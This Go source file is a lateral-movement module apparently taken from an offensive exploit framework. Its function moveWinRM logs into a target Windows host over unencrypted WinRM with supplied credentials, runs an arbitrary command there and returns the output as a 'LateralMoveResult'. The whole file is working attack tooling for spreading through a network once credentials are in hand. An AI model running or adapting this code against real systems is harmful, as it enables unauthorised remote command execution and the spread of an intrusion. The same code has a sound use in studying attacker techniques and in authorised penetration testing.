package lateral

import (
	"bytes"
	"context"
	"fmt"

	"github.com/masterzen/winrm"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

func moveWinRM(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveResult, error) {
	if cfg.Target == "" {
		return nil, fmt.Errorf("target required")
	}
	if cfg.Command == "" {
		return nil, fmt.Errorf("command required")
	}

	endpoint := winrm.NewEndpoint(cfg.Target, 5985, false, true, nil, nil, nil, 0)

	username := cfg.Username
	password := cfg.Password
	if username == "" {
		return nil, fmt.Errorf("username required for WinRM")
	}

	client, err := winrm.NewClient(endpoint, username, password)
	if err != nil {
		return nil, fmt.Errorf("create WinRM client: %w", err)
	}

	var stdout, stderr bytes.Buffer
	exitCode, err := client.RunWithContext(ctx, cfg.Command, &stdout, &stderr)
	if err != nil {
		return nil, fmt.Errorf("WinRM exec: %w", err)
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nSTDERR:\n" + stderr.String()
	}

	return &pb.LateralMoveResult{
		Method:  "winrm",
		Target:  cfg.Target,
		Success: exitCode == 0,
		Output:  output,
	}, nil
}
